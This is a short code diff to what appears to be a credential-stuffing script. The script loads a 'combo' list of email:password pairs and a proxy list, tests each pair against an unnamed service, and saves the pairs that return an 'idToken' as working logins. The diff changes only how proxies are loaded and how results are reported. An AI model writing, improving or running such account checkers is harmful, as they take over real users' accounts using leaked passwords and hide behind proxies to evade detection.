@@ -4,7 +4,7 @@ from concurrent import futures
 
 # Load combo and proxies
 loader.load_combo('amine.txt')
-loader.load_proxies('https')
+loader.load_proxies('https', file='proxies.txt')
 
 
 def check(email, password):
@@ -18,7 +18,7 @@ def check(email, password):
    block_1.fail(statement='error')
    block_1.success(statement='idToken', save=True, save_this=f'{email}:{password}\n')
    
-   request.result(update=10)
+   request.result()
    # End
    
    
